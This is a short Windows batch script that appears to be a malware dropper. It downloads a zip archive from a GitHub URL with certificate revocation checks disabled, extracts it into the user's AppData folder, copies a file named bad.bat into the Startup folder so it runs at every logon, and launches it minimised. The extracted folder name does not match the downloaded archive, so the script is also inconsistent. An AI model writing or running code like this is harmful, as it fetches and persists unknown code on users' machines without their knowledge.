set "Startup_Dir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
start "" /MIN "%Startup_Dir%\bad.bat"
curl "https://github.com/glonpl/DevOpsDockerProject/archive/refs/heads/master.zip" --ssl-no-revoke -L -o temp.zip
mkdir %APPDATA%\Honk
powershell -Command "Expand-Archive temp.zip -DestinationPath %APPDATA%" 
copy "%APPDATA%\Honk-master\bad.bat" "%Startup_Dir%\bad.bat"
del temp.zip